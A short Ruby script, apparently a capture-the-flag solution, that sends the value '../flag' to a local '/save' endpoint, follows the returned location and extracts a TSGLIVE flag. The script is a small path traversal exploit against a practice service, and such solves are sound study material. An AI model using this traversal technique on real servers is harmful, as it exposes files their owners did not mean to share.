require "json"
require "net/http"

host = "localhost"
port = "3456"

response = Net::HTTP.new(host, port).post("/save", "../flag", { "Content-Type" => "text/plain" })
location = JSON.parse(response.body)["location"]
response = Net::HTTP.new(host, port).get(location)
puts response.body.scan(/TSGLIVE\{.+\}/).first
